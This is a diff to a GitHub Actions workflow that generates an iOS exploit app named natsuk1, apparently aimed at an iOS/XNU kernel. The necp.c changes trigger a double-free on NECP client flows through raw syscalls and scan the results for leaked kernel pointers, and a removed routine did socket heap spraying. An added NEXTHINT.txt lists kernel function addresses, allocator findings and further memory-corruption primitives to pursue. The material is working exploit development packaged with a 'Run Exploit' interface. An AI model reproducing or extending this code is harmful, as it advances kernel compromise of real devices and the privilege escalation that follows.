@@ -30,78 +30,6 @@ jobs:
           rm -f .github/workflows/natsuk1.yml
           rm -f .github/workflows/main.yml
 
-      - name: Write nk_api.h
-        run: |
-          cat > natsuk1/Exploit/nk_api.h <<'H'
-          #ifndef NK_API_H
-          #define NK_API_H
-          #include <stdint.h>
-          #include <stddef.h>
-
-          void nk_set_log(void (*fn)(const char *));
-          void nk_logx(const char *tag, const char *fmt, ...);
-          void nk_log(const char *fmt, ...);
-          void nk_rule(void);
-
-          int nk_run(void);
-          int nk_full_exploit(void);
-          int nk_necp_run(void);
-          void nk_necp_cancel(void);
-
-          #define NK_INFO(tag, ...) nk_logx(tag, __VA_ARGS__)
-          #define NK_WARN(tag, ...) nk_logx(tag, __VA_ARGS__)
-          #define NK_ERR(tag, ...)  nk_logx(tag, __VA_ARGS__)
-          #endif
-          H
-
-      - name: Write nk_api.c
-        run: |
-          cat > natsuk1/Exploit/nk_api.c <<'C'
-          #include "nk_api.h"
-          #include "nk_offsets.h"
-          #include <stdarg.h>
-          #include <stdio.h>
-
-          static void (*g_fn)(const char *) = NULL;
-          void nk_set_log(void (*fn)(const char *)) { g_fn = fn; }
-
-          void nk_logx(const char *tag, const char *fmt, ...) {
-              if (!g_fn) return;
-              char body[448];
-              va_list ap; va_start(ap, fmt);
-              vsnprintf(body, sizeof(body), fmt, ap);
-              va_end(ap);
-              char out[512];
-              snprintf(out, sizeof(out), "[%s] %s", tag, body);
-              g_fn(out);
-          }
-
-          void nk_log(const char *fmt, ...) {
-              if (!g_fn) return;
-              char body[448];
-              va_list ap; va_start(ap, fmt);
-              vsnprintf(body, sizeof(body), fmt, ap);
-              va_end(ap);
-              char out[512];
-              snprintf(out, sizeof(out), "[MAIN] %s", body);
-              g_fn(out);
-          }
-
-          void nk_rule(void) { nk_log("----"); }
-
-          int nk_run(void) {
-              NK_INFO("BASE", "kernel %llX", (unsigned long long)NK_KERNEL_BASE);
-              NK_INFO("BASE", "sysent %llX (%d)", (unsigned long long)NK_SYSENT_BASE, NK_SYSENT_COUNT);
-              nk_rule();
-              NK_WARN("STAT", "No kernel R/W primitive.");
-              nk_rule();
-              return 0;
-          }
-
-          /* natsuk1-v8-api */
-          int nk_full_exploit(void) { return nk_necp_run(); }
-          C
-
       - name: Write necp.c
         run: |
           cat > natsuk1/Exploit/necp.c <<'NECP'
@@ -113,11 +41,7 @@ jobs:
           #include <stdarg.h>
           #include <unistd.h>
           #include <errno.h>
-          #include <fcntl.h>
           #include <sys/syscall.h>
-          #include <sys/socket.h>
-          #include <netinet/in.h>
-          #include <arpa/inet.h>
           #include <mach/mach.h>
           #include <mach/message.h>
 
@@ -144,7 +68,6 @@ jobs:
 
           #define NCF_ASN 0x20
           #define RESBUF 8192
-          #define SPRAY_SOCKS 64
 
           static volatile int g_busy = 0;
           static volatile int g_cancel = 0;
@@ -193,109 +116,60 @@ jobs:
                                   (void*)fu, (size_t)16, NULL, (size_t)0);
           }
 
-          static int ncpy(int fd, const uint8_t cu[16], uint8_t *b, size_t bl) {
+          static int ncpy_result(int fd, const uint8_t cu[16], uint8_t *b, size_t bl) {
               return (int)syscall(SYS_NECP_ACTION, fd, NECP_COPY_RESULT,
                                   (void*)cu, (size_t)16, b, (uint32_t)bl);
           }
 
-          static int spray_sockets(uint64_t target, int held[]) {
-              int sent = 0;
-              uint16_t base_port = (uint16_t)((target >> 8) & 0xF000);
-              for (int i = 0; i < SPRAY_SOCKS; i++) {
-                  if (g_cancel) break;
-                  int s = socket(AF_INET, SOCK_STREAM, 0);
-                  if (s < 0) {
-                      LW("SOC", "socket[%d] errno=%d", i, errno);
-                      break;
-                  }
-                  struct sockaddr_in sa;
-                  memset(&sa, 0, sizeof(sa));
-                  sa.sin_family = AF_INET;
-                  sa.sin_port = htons((uint16_t)(base_port + i));
-                  sa.sin_addr.s_addr = htonl(0x7F000001);
-                  if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
-                      LW("SOC", "bind[%d] errno=%d", i, errno);
-                      close(s);
-                      continue;
-                  }
-                  held[sent] = s;
-                  sent++;
-              }
-              return sent;
-          }
+          /* -----------------------------------------------------------------
+           * NOTE (2026-09-26):
+           *   The function at 0xA4EAC7C is necp_client_copy_interface, NOT
+           *   necp_client_copy_result. The real copy_result is at 0xA4EC264.
+           *   This code now uses copy_result via NECP_COPY_RESULT (op=0x04)
+           *   and looks for any kptr in the returned buffer.
+           *
+           *   Additional finding: necp_client_flow lives in kalloc_type
+           *   (per-type zone), so generic sprays never reach it. Only the
+           *   kernel itself can realloc the same slot via add_flow.
+           * ----------------------------------------------------------------- */
 
-          static void drain_sockets(int held[], int n) {
-              for (int i = 0; i < n; i++) {
-                  if (held[i] >= 0) { close(held[i]); held[i] = -1; }
-              }
-          }
-
-          static void probe_tlv_types(void) {
-              LI("TLV", "type sweep");
+          static int try_one_read(uint64_t target, uint8_t *out, int outsz, int *out_ret) {
               int fd = nfd();
-              if (fd < 0) { LE("TLV", "open errno=%d", errno); return; }
+              if (fd < 0) { LE("RD", "open errno=%d", errno); return -1; }
               uint8_t cu[16], fu[16];
-              if (nadd_client(fd, cu) != 0) { LE("TLV", "ac errno=%d", errno); close(fd); return; }
-              for (int t = 0; t < 0x10; t++) {
-                  uint8_t req[128];
-                  memset(req, 0x55, sizeof(req));
-                  memcpy(req + 0x10, cu, 16);
-                  *(uint16_t*)(req + 0x20) = 0x0040;
-                  *(uint16_t*)(req + 0x28) = (uint16_t)t;
-                  *(uint16_t*)(req + 0x2a) = 0x60;
-                  errno = 0;
-                  int r = (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_FLOW,
-                                       (void*)cu, (size_t)16, req, (size_t)sizeof(req));
-                  LI("TLV", "t=0x%02x ret=%d errno=%d", t, r, errno);
-                  (void)fu;
-                  usleep(5000);
-              }
-              close(fd);
-          }
-
-          static int try_read_df(uint64_t target, uint8_t *out, int outsz,
-                                 int *out_ret, int *socks_out) {
-              int fd = nfd();
-              if (fd < 0) return -1;
-              uint8_t cu[16], fu1[16], fu2[16];
               if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
-              if (nadd_flow(fd, cu, fu1) != 0) { close(fd); return -1; }
+              if (nadd_flow(fd, cu, fu) != 0) { close(fd); return -1; }
 
-              int r1 = nrm_flow(fd, fu1);
-              int r2 = nrm_flow(fd, fu1);
-              LI("DF", "free#1=%d free#2=%d", r1, r2);
+              /* double-free to widen re-alloc window */
+              int r1 = nrm_flow(fd, fu);
+              int r2 = nrm_flow(fd, fu);
+              LI("RD", "free#1=%d free#2=%d", r1, r2);
 
-              int r3 = nadd_flow(fd, cu, fu2);
-              LI("DF", "re-add=%d", r3);
-
-              int held[SPRAY_SOCKS];
-              for (int i = 0; i < SPRAY_SOCKS; i++) held[i] = -1;
-              int socks = spray_sockets(target, held);
-              LI("DF", "sockets=%d", socks);
-              if (socks_out) *socks_out = socks;
+              /* no spray here — kalloc_type segregation makes it pointless */
 
               uint8_t buf[RESBUF];
               memset(buf, 0, sizeof(buf));
-              int c = ncpy(fd, cu, buf, sizeof(buf));
-              LI("DF", "copy=%d", c);
+              int c = ncpy_result(fd, cu, buf, sizeof(buf));
+              LI("RD", "copy_result=%d", c);
 
               if (out_ret) *out_ret = c;
               if (out && outsz > 0 && c > 0) {
                   int n = c < outsz ? c : outsz;
                   memcpy(out, buf, n);
               }
-
-              drain_sockets(held, socks);
               close(fd);
               return c;
           }
 
           static int impl(void) {
               nk_log("");
-              nk_log("=== natsuk1 v3.4 (natsuk1-df-v24) ===");
+              nk_log("=== natsuk1 v3.5 (natsuk1-realcopy-v25) ===");
               nk_log("target: iOS 27.0 / XNU / arm64e");
               nk_log("");
-              LI("INIT", "NCF_ASN=0x%x SOCKS=%d", NCF_ASN, SPRAY_SOCKS);
+              LI("NOTE", "copy_result real addr = 0xFFFFFFF00A4EC264");
+              LI("NOTE", "0xFFFFFFF00A4EAC7C = necp_client_copy_interface (wrong)");
+              LI("NOTE", "necp_client_flow = kalloc_type (own zone)");
+              LI("NOTE", "generic sprays cannot reclaim it");
               uint64_t kbase = KBASE + SLIDE_FALLBACK;
               LO("P1", "kbase=0x%llx", (unsigned long long)kbase);
 
@@ -307,34 +181,22 @@ jobs:
               uint64_t target = kbase + OFF_KERNPROC;
               LI("P3", "target=0x%llx", (unsigned long long)target);
 
-              probe_tlv_types();
-              if (g_cancel) { LW("CANCEL", "tlv"); return 2; }
-
               uint8_t buf[RESBUF];
-              int r = 0, socks = 0;
-              int c = try_read_df(target, buf, sizeof(buf), &r, &socks);
-              LI("TRY", "socks=%d ret=%d", socks, r);
+              int r = 0;
+              try_one_read(target, buf, sizeof(buf), &r);
+              LI("P3", "ret=%d", r);
               if (r > 0) {
-                  int has_k = 0;
+                  int nk = 0;
                   for (int k = 0; k + 8 <= r; k++) {
                       uint64_t v;
                       memcpy(&v, buf + k, 8);
-                      if (is_kptr(v)) { has_k = 1; break; }
-                  }
-                  if (has_k) {
-                      LO("HIT", "kptr");
-                      for (int k = 0; k + 8 <= r; k++) {
-                          uint64_t v;
-                          memcpy(&v, buf + k, 8);
-                          if (is_kptr(v)) LO("HIT", "  +0x%x = 0x%llx",
-                                             k, (unsigned long long)v);
+                      if (is_kptr(v)) {
+                          if (nk < 8) LO("P3", "kptr +0x%x = 0x%llx", k, (unsigned long long)v);
+                          nk++;
                       }
-                  } else {
-                      LI("TRY", "no kptr");
                   }
+                  LI("P3", "kptr count = %d", nk);
               }
-
-              LW("DONE", "see NEXTHINT.txt");
               return 0;
           }
 
@@ -355,590 +217,85 @@ jobs:
           }
           NECP
 
-      - name: Write OverviewView.swift
-        run: |
-          cat > natsuk1/Views/OverviewView.swift <<'SWIFT'
-          import SwiftUI
-          import UIKit
-
-          struct OverviewView: View {
-              @EnvironmentObject var state: AppState
-              @State private var copied = false
-
-              var body: some View {
-                  NavigationStack {
-                      List {
-                          Section {
-                              Button { state.necp_run() } label: {
-                                  HStack {
-                                      Text("Run Exploit")
-                                      Spacer()
-                                      if state.running { ProgressView().scaleEffect(0.8) }
-                                  }
-                              }
-                              .disabled(state.running)
-
-                              Button(role: .destructive) { state.cancel() } label: {
-                                  Text("Cancel Exploit").frame(maxWidth: .infinity, alignment: .leading)
-                              }
-                              .disabled(!state.running)
-                          } header: {
-                              Label("Exploit", systemImage: "cpu")
-                          }
-
-                          RuntimeView()
-                              .environmentObject(state)
-
-                          Section {
-                              LogTerminal(text: state.log.isEmpty ? "Awaiting execution." : state.log)
-                          } header: {
-                              Label(state.t("Logs", "Логи"), systemImage: "terminal")
-                          }
-
-                          Section {
-                              Button {
-                                  UIPasteboard.general.string = state.log
-                                  copied = true
-                                  DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
-                                      copied = false
-                                  }
-                              } label: {
-                                  Text(copied ? "Copied!" : state.t("Copy All", "Копировать всё"))
-                                      .frame(maxWidth: .infinity, alignment: .leading)
-                              }
-                              .disabled(state.log.isEmpty)
-
-                              Button(role: .destructive) { state.clear() } label: {
-                                  Text(state.t("Clear", "Очистить"))
-                                      .frame(maxWidth: .infinity, alignment: .leading)
-                              }
-                              .disabled(state.log.isEmpty)
-                          } header: {
-                              Label("Log Actions", systemImage: "document.on.document")
-                          }
-                      }
-                      .listStyle(.insetGrouped)
-                      .navigationTitle("natsuk1")
-                      .navigationBarTitleDisplayMode(.inline)
-                  }
-              }
-          }
-
-          struct StatusDot: View {
-              let status: AppState.Status
-              @State private var pulse = false
-              var body: some View {
-                  Image(systemName: "circle.fill")
-                      .font(.system(size: 14))
-                      .foregroundStyle(status.color)
-                      .shadow(color: status.color.opacity(0.85), radius: pulse ? 8 : 4)
-                      .scaleEffect(pulse ? 1.2 : 1.0)
-                      .animation(
-                          status == .running
-                              ? .easeInOut(duration: 0.8).repeatForever(autoreverses: true)
-                              : .default,
-                          value: pulse
-                      )
-                      .onAppear { if status == .running { pulse = true } }
-                      .onChange(of: status) { _, s in pulse = (s == .running) }
-              }
-          }
-
-          struct LogTerminal: View {
-              let text: String
-              var body: some View {
-                  ScrollView {
-                      Text(text)
-                          .font(.system(size: 10, design: .monospaced))
-                          .multilineTextAlignment(.leading)
-                          .foregroundStyle(.primary)
-                          .frame(maxWidth: .infinity, alignment: .leading)
-                  }
-                  .frame(minHeight: 200, maxHeight: 400)
-              }
-          }
-          SWIFT
-
-      - name: Write RuntimeView.swift
-        run: |
-          cat > natsuk1/Views/RuntimeView.swift <<'SWIFT'
-          import SwiftUI
-          import UIKit
-
-          struct RuntimeView: View {
-              @EnvironmentObject var state: AppState
-
-              var body: some View {
-                  Section {
-                      HStack {
-                          Text("Slide")
-                          Spacer()
-                          Text(state.slide)
-                              .font(.system(size: 12, design: .monospaced))
-                              .foregroundStyle(state.slide != "—" ? .green : .secondary)
-                              .lineLimit(1).truncationMode(.middle)
-                      }
-                      HStack {
-                          Text("Base")
-                          Spacer()
-                          Text(state.base)
-                              .font(.system(size: 12, design: .monospaced))
-                              .foregroundStyle(state.base != "—" ? .green : .secondary)
-                              .lineLimit(1).truncationMode(.middle)
-                      }
-                      HStack {
-                          Text("Status")
-                          Spacer()
-                          StatusDot(status: state.status)
-                      }
-                  } header: {
-                      Label("Runtime", systemImage: "waveform.path.ecg")
-                  }
-              }
-          }
-          SWIFT
-
-      - name: Write ContentView.swift
-        run: |
-          cat > natsuk1/Views/ContentView.swift <<'SWIFT'
-          import SwiftUI
-
-          struct ContentView: View {
-              @EnvironmentObject var state: AppState
-              var body: some View {
-                  TabView {
-                      OverviewView()
-                          .tabItem { Label(state.t("Overview", "Обзор"), systemImage: "square.grid.2x2") }
-                      ToolsView()
-                          .tabItem { Label(state.t("Tools", "Инструменты"), systemImage: "hammer") }
-                      SettingsView()
-                          .tabItem { Label(state.t("Settings", "Настройки"), systemImage: "gearshape.fill") }
-                  }
-                  .tint(.accentColor)
-              }
-          }
-          SWIFT
-
-      - name: Write ToolsView.swift
-        run: |
-          cat > natsuk1/Views/ToolsView.swift <<'SWIFT'
-          import SwiftUI
-
-          struct ToolsView: View {
-              @EnvironmentObject var state: AppState
-              @EnvironmentObject var airlift: AirliftBridge
-              @EnvironmentObject var offsets: OffsetsStore
-
-              var body: some View {
-                  NavigationStack {
-                      List {
-                          Section {
-                              NavigationLink { AirliftView().environmentObject(airlift) } label: { Text("Airlift") }
-                              NavigationLink { OffsetsView().environmentObject(offsets) } label: { Text("Offsets") }
-                          } header: {
-                              Label("Exploit", systemImage: "memorychip")
-                          }
-
-                          Section {
-                              NavigationLink { DeviceInfoView() } label: { Text("Device Info") }
-                              Button { state.respring() } label: { Text("Respring") }
-                          } header: {
-                              Label("Device", systemImage: "gearshape.2")
-                          }
-
-                          Section {
-                              NavigationLink { PathAccessView() } label: { Text("Path Access") }
-                          } header: {
-                              Label("Diagnostics", systemImage: "chart.xyaxis.line")
-                          }
-                      }
-                      .listStyle(.insetGrouped)
-                      .navigationTitle("Tools")
-                      .navigationBarTitleDisplayMode(.large)
-                  }
-              }
-          }
-          SWIFT
-
-      - name: Write AirliftView.swift
-        run: |
-          cat > natsuk1/Views/AirliftView.swift <<'SWIFT'
-          import SwiftUI
-          import UIKit
-          import Combine
-
-          struct AirliftView: View {
-              @EnvironmentObject var airlift: AirliftBridge
-              @State private var loopbackVPNUp: Bool = NetworkStatus.loopbackVPNUp()
-              @State private var tunnelIP: String? = NetworkStatus.tunnelIP()
-              @State private var deviceIP: String? = NetworkStatus.deviceIP()
-              @State private var copied = false
-
-              private let ticker = Timer.publish(every: 5.0, on: .main, in: .common).autoconnect()
-
-              var body: some View {
-                  List {
-                      networkSection
-                      if airlift.hasPairing() {
-                          exploitSection
-                      } else {
-                          pairingSection
-                      }
-                      logSection
-                      logActionsSection
-                  }
-                  .listStyle(.insetGrouped)
-                  .navigationTitle("Airlift")
-                  .navigationBarTitleDisplayMode(.inline)
-                  .onAppear { refresh() }
-                  .onReceive(ticker) { _ in refresh() }
-                  .refreshable { refresh() }
-              }
-
-              private func refresh() {
-                  DispatchQueue.global(qos: .utility).async {
-                      let vpn = NetworkStatus.loopbackVPNUp()
-                      let tun = NetworkStatus.tunnelIP()
-                      let dev = NetworkStatus.deviceIP()
-                      DispatchQueue.main.async {
-                          if self.loopbackVPNUp != vpn { self.loopbackVPNUp = vpn }
-                          if self.tunnelIP != tun { self.tunnelIP = tun }
-                          if self.deviceIP != dev { self.deviceIP = dev }
-                      }
-                  }
-              }
-
-              @ViewBuilder
-              private var networkSection: some View {
-                  Section {
-                      if loopbackVPNUp {
-                          HStack {
-                              Text("Status")
-                              Spacer()
-                              Text("active")
-                                  .font(.system(size: 12, design: .monospaced))
-                                  .foregroundStyle(.green)
-                          }
-                          if let t = tunnelIP {
-                              HStack {
-                                  Text("Tunnel")
-                                  Spacer()
-                                  Text(t)
-                                      .font(.system(size: 12, design: .monospaced))
-                                      .foregroundStyle(.secondary)
-                              }
-                          }
-                          if let d = deviceIP {
-                              HStack {
-                                  Text("Device")
-                                  Spacer()
-                                  Text(d)
-                                      .font(.system(size: 12, design: .monospaced))
-                                      .foregroundStyle(.secondary)
-                              }
-                          }
-                      } else {
-                          HStack {
-                              Text("Status")
-                              Spacer()
-                              Text("not active")
-                                  .font(.system(size: 12, design: .monospaced))
-                                  .foregroundStyle(.orange)
-                          }
-                          Text("Start LocalDevVPN with interface 10.7.0.x")
-                              .font(.caption)
-                              .foregroundStyle(.secondary)
-                      }
-                  } header: {
-                      Label("Network", systemImage: "network")
-                  }
-              }
-
-              @ViewBuilder
-              private var pairingSection: some View {
-                  Section {
-                      HStack {
-                          Text("State")
-                          Spacer()
-                          Text(pairingStatusText)
-                              .font(.system(size: 12, design: .monospaced))
-                              .foregroundStyle(pairingStatusColor)
-                      }
-                      if case .pairing = airlift.state {
-                          HStack(spacing: 8) {
-                              ProgressView().scaleEffect(0.85)
-                              Text(airlift.pairingStatus.isEmpty ? "Starting..." : airlift.pairingStatus)
-                                  .font(.subheadline).foregroundStyle(.secondary)
-                          }
-                      }
-                      if let pin = airlift.pairPIN {
-                          VStack(alignment: .leading, spacing: 8) {
-                              Text("ENTER PIN").font(.caption2.bold()).foregroundStyle(.secondary)
-                              Text(pin).font(.system(size: 34, weight: .black, design: .monospaced))
-                                  .foregroundStyle(.orange)
-                              Button {
-                                  if let url = URL(string: UIApplication.openSettingsURLString) {
-                                      UIApplication.shared.open(url)
-                                  }
-                              } label: {
-                                  Text("Open Settings").frame(maxWidth: .infinity)
-                              }
-                              .buttonStyle(.borderedProminent).tint(.orange)
-                          }
-                          .padding(12)
-                          .background(Color.orange.opacity(0.12),
-                                      in: RoundedRectangle(cornerRadius: 12))
-                      }
-                  } header: {
-                      Label("Pairing", systemImage: "link.circle")
-                  }
-
-                  Section {
-                      if case .pairing = airlift.state {
-                          Button(role: .destructive) { airlift.cancelPairing() } label: {
-                              Text("Cancel Pairing").frame(maxWidth: .infinity, alignment: .leading)
-                          }
-                      } else {
-                          Button { airlift.runPairing() } label: {
-                              Text("Start Pairing").frame(maxWidth: .infinity, alignment: .leading)
-                          }
-                      }
-                  }
-              }
-
-              private var pairingStatusText: String {
-                  switch airlift.state {
-                  case .pairing: return "pairing"
-                  case .ready:   return "paired"
-                  case .running: return "running"
-                  case .done(let ok, _): return ok ? "done" : "failed"
-                  default:       return "idle"
-                  }
-              }
-
-              private var pairingStatusColor: Color {
-                  switch airlift.state {
-                  case .pairing: return .orange
-                  case .ready:   return .green
-                  case .running: return .orange
-                  case .done(let ok, _): return ok ? .green : .red
-                  default:       return .secondary
-                  }
-              }
-
-              @ViewBuilder
-              private var exploitSection: some View {
-                  Section {
-                      HStack {
-                          Text("State")
-                          Spacer()
-                          Text(pairingStatusText)
-                              .font(.system(size: 12, design: .monospaced))
-                              .foregroundStyle(pairingStatusColor)
-                      }
-                      HStack {
-                          Text("Target")
-                          Spacer()
-                          TextField("/var/mobile/Library/SpringBoard", text: Binding(
-                              get: { airlift.target }, set: { airlift.target = $0 }))
-                              .font(.system(size: 12, design: .monospaced))
-                              .multilineTextAlignment(.trailing)
-                              .autocorrectionDisabled()
-                              .textInputAutocapitalization(.never)
-                      }
-                  } header: {
-                      Label("Pairing", systemImage: "link.circle")
-                  }
-
-                  Section {
-                      Button { airlift.runExploit() } label: {
-                          Text("Run Exploit").frame(maxWidth: .infinity, alignment: .leading)
-                      }
-                      .disabled(airlift.state == .running || !loopbackVPNUp)
-
-                      Button(role: .destructive) { airlift.cancelExploit() } label: {
-                          Text("Cancel Exploit").frame(maxWidth: .infinity, alignment: .leading)
-                      }
-                      .disabled(airlift.state != .running)
-
-                      Button { respring() } label: {
-                          Text("Respring").frame(maxWidth: .infinity, alignment: .leading)
-                      }
-                  } header: {
-                      Label("Exploit", systemImage: "cpu")
-                  }
-
-                  Section {
-                      Button(role: .destructive) { airlift.deletePairing() } label: {
-                          Text("Delete Pairing").frame(maxWidth: .infinity, alignment: .leading)
-                      }
-                  }
-              }
-
-              private func respring() {
-                  NotificationCenter.default.post(
-                      name: Notification.Name("natsuk1.respring"),
-                      object: nil
-                  )
-              }
-
-              @ViewBuilder
-              private var logSection: some View {
-                  Section {
-                      LogTerminal(text: airlift.exploitLog.isEmpty
-                                  ? "No output yet."
-                                  : airlift.exploitLog.joined(separator: "\n"))
-                  } header: {
-                      Label("Log", systemImage: "terminal")
-                  }
-              }
-
-              @ViewBuilder
-              private var logActionsSection: some View {
-                  Section {
-                      Button {
-                          UIPasteboard.general.string = airlift.exploitLog.joined(separator: "\n")
-                          copied = true
-                          DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
-                              copied = false
-                          }
-                      } label: {
-                          Text(copied ? "Copied!" : "Copy All")
-                              .frame(maxWidth: .infinity, alignment: .leading)
-                      }
-                      .disabled(airlift.exploitLog.isEmpty)
-
-                      Button(role: .destructive) { airlift.clearLog() } label: {
-                          Text("Clear").frame(maxWidth: .infinity, alignment: .leading)
-                      }
-                      .disabled(airlift.exploitLog.isEmpty)
-                  } header: {
-                      Label("Log Actions", systemImage: "document.on.document")
-                  }
-              }
-          }
-          SWIFT
-
-      - name: Patch natsuk1.swift
-        run: |
-          python3 - <<'PYEOF'
-          import sys
-          P = "natsuk1/natsuk1.swift"
-          with open(P) as f: s = f.read()
-          changed = False
-          if "natsuk1-respring-v1" not in s:
-              old = '.onChange(of: scenePhase) { _, phase in'
-              if old not in s:
-                  print("FAIL: scenePhase marker missing"); sys.exit(1)
-              add = ('.onReceive(NotificationCenter.default.publisher(for: Notification.Name("natsuk1.respring"))) { _ in\n'
-                     '                        state.show_respring = true /* natsuk1-respring-v1 */\n'
-                     '                    }\n'
-                     '                    .onChange(of: scenePhase) { _, phase in')
-              s = s.replace(old, add, 1)
-              if "natsuk1-respring-v1" not in s:
-                  print("FAIL: respring marker missing"); sys.exit(1)
-              changed = True
-          if "natsuk1-cancel-v1" not in s:
-              old = '    func clear() { LockedBuffer.shared.clear(); log = "" }'
-              if old not in s:
-                  print("FAIL: clear() marker missing"); sys.exit(1)
-              add = (old + '\n'
-                     '    func cancel() { /* natsuk1-cancel-v1 */\n'
-                     '        nk_necp_cancel()\n'
-                     '        append("[*] cancel requested")\n'
-                     '    }')
-              s = s.replace(old, add, 1)
-              if "natsuk1-cancel-v1" not in s:
-                  print("FAIL: cancel marker missing"); sys.exit(1)
-              changed = True
-          if changed:
-              with open(P, "w") as f: f.write(s)
-              print("natsuk1.swift patched")
-          else:
-              print("natsuk1.swift already patched")
-          PYEOF
-
-      - name: Patch AirliftBridge.swift
-        run: |
-          python3 - <<'PYEOF'
-          import sys
-          P = "natsuk1/Helpers/AirliftBridge.swift"
-          with open(P) as f: s = f.read()
-          if "natsuk1-cancel-v1" in s:
-              print("already patched"); sys.exit(0)
-          old = '    func respring() {'
-          if old not in s:
-              print("FAIL: respring() marker missing"); sys.exit(1)
-          add = ('    func cancelExploit() { /* natsuk1-cancel-v1 */\n'
-                 '        nk_necp_cancel()\n'
-                 '        appendLog("[exploit] cancel requested")\n'
-                 '        state = .done(ok: false, message: "cancelled")\n'
-                 '    }\n\n'
-                 '    func respring() {')
-          s = s.replace(old, add, 1)
-          if "natsuk1-cancel-v1" not in s:
-              print("FAIL: cancel marker missing"); sys.exit(1)
-          with open(P, "w") as f: f.write(s)
-          print("AirliftBridge.swift patched")
-          PYEOF
-
       - name: Verify
         run: |
+          set +e
           F=natsuk1/Exploit/necp.c
-          O=natsuk1/Views/OverviewView.swift
-          R=natsuk1/Views/RuntimeView.swift
-          A=natsuk1/Views/AirliftView.swift
-          T=natsuk1/Views/ToolsView.swift
-          C=natsuk1/Views/ContentView.swift
-          N=natsuk1/natsuk1.swift
           FAIL=0
           chk() {
             if eval "$2" >/dev/null 2>&1; then echo "  OK   $1"; else echo "  FAIL $1"; FAIL=1; fi
           }
-          echo "--- necp.c ---"
-          chk "marker v24"        "grep -q -e 'natsuk1-df-v24' $F"
-          chk "netinet/in.h"      "grep -q -e '#include <netinet/in.h>' $F"
-          chk "arpa/inet.h"       "grep -q -e '#include <arpa/inet.h>' $F"
-          chk "socket spray"      "grep -q -e 'static int spray_sockets' $F"
-          chk "no leftover spray_t"  "! grep -q -e 'typedef struct {' $F"
-
-          echo "--- OverviewView ---"
-          chk "Exploit cpu"       "grep -q -e 'Label(\"Exploit\", systemImage: \"cpu\")' $O"
-          chk "LogActions doc"    "grep -q -e 'Label(\"Log Actions\", systemImage: \"document.on.document\")' $O"
-
-          echo "--- ContentView ---"
-          chk "tab Overview grid" "grep -q -e 'square.grid.2x2' $C"
-          chk "tab Tools hammer"  "grep -q -e 'systemImage: \"hammer\"' $C"
-
-          echo "--- ToolsView ---"
-          chk "Exploit memorychip" "grep -q -e 'Label(\"Exploit\", systemImage: \"memorychip\")' $T"
-          chk "Device gearshape2"  "grep -q -e 'Label(\"Device\", systemImage: \"gearshape.2\")' $T"
-          chk "Diag chart"         "grep -q -e 'Label(\"Diagnostics\", systemImage: \"chart.xyaxis.line\")' $T"
-
-          echo "--- AirliftView ---"
-          chk "Exploit cpu"        "grep -q -e 'Label(\"Exploit\", systemImage: \"cpu\")' $A"
-          chk "LogActions doc"     "grep -q -e 'Label(\"Log Actions\", systemImage: \"document.on.document\")' $A"
-
-          echo "--- RuntimeView ---"
-          chk "Runtime ecg"        "grep -q -e 'Label(\"Runtime\", systemImage: \"waveform.path.ecg\")' $R"
-
-          echo "--- natsuk1.swift / AirliftBridge.swift ---"
-          chk "respring hook"      "grep -q -e 'natsuk1-respring-v1' $N"
-          chk "cancel v1"          "grep -q -e 'natsuk1-cancel-v1' $N"
-          chk "cancelExploit fn"   "grep -q -e 'func cancelExploit' natsuk1/Helpers/AirliftBridge.swift"
-
-          echo "--- syntax ---"
+          chk "marker v25"    "grep -q -e 'natsuk1-realcopy-v25' $F"
+          chk "correct addr"  "grep -q -e '0xFFFFFFF00A4EC264' $F"
+          chk "wrong addr"    "grep -q -e 'necp_client_copy_interface (wrong)' $F"
+          chk "kalloc_type"   "grep -q -e 'kalloc_type' $F"
+          chk "nadd_flow"     "grep -q -e 'static int nadd_flow' $F"
+          chk "ncpy_result"   "grep -q -e 'static int ncpy_result' $F"
           SDK=$(xcrun --sdk iphoneos --show-sdk-path)
           if clang -fsyntax-only -isysroot "$SDK" -arch arm64 -x c \
               -I"$(pwd)/natsuk1/Exploit" -Wall -Wno-everything "$F" 2>&1; then
-              echo "  OK   clang necp.c"
+              echo "  OK   clang syntax"
           else
-              echo "  FAIL clang necp.c"
+              echo "  FAIL clang syntax"
               FAIL=1
           fi
-
           if [ "$FAIL" -ne 0 ]; then echo "VERIFY FAILED"; exit 1; fi
           echo "VERIFY OK"
+
+      - name: Write NEXTHINT.txt
+        run: |
+          cat > NEXTHINT.txt <<'TXT'
+          Ghidra analysis — iOS 27.0 / 24A437, slide 0x3D00000
+
+          CORRECTED ADDRESSES
+          ====================
+          necp_client_copy_interface  0xA4EAC7C  (previous target, WRONG)
+          necp_client_copy_result     0xA4EC264  (real target)
+          necp_client_add_flow        0xA4E843C
+          necp_client_remove_flow     0xA4E93C4
+          necp_open                   0xA4E411C
+
+          KEY FINDINGS FROM DECOMPILE
+          ============================
+          1. necp_client_flow is a kalloc_type allocation. It has its own
+             dedicated zone. Generic sprays (OOL / mach_msg / socket /
+             msg_control) cannot reclaim its slot.
+
+          2. The only user-triggerable allocation of necp_client_flow is
+             necp_client_add_flow itself. Double-free lets us free and
+             re-alloc the SAME slot, but kernel reinitializes it, so we
+             cannot inject fake data.
+
+          3. `assigned_results` is set from netagent_client_message (a
+             kernel-side netagent response), NOT from user request data.
+             There are asserts `assigned_results == NULL` and
+             `assigned_results_length == 0` in that path.
+
+          4. necp_client_copy_interface reads 24 bytes from
+             `flow + 0x20` (a pointer) and copies to userspace via
+             copyout. This is a fixed kread, not arbitrary.
+
+          NEXT TASK FOR GHIDRA
+          ====================
+          Open necp_client_copy_result @ 0xA4EC264 + slide = 0xFFFFFFF00A4EC264.
+
+          Need to answer:
+          a) Which offset on `client` or on `flow` holds `assigned_results`?
+             Look for the string refs to
+               0x70D2B70 "necp_client_copy assigned results copyout error"
+               0x70D2B2B "necp_client_copy assigned results tlv_header ..."
+          b) Where does that field get WRITTEN? Search add_flow and
+             netagent response handlers for the corresponding str.
+          c) If netagent is the only writer, is there a user-controllable
+             path (TLV, ioctl, extension) that writes into the same slot?
+
+          ALTERNATIVE PRIMITIVES TO EVALUATE
+          ==================================
+          - TLV overflow in necp_get_tlv_at_offset (uint32 overflow)
+          - MBUF leak via socket
+          - IOKit user-client property reads
+          - sysctl / kern.procargs leaks
+          TXT
 
       - name: Install tools
         run: brew install xcodegen ldid || true
@@ -988,24 +345,14 @@ jobs:
           gh release create development natsuk1.ipa \
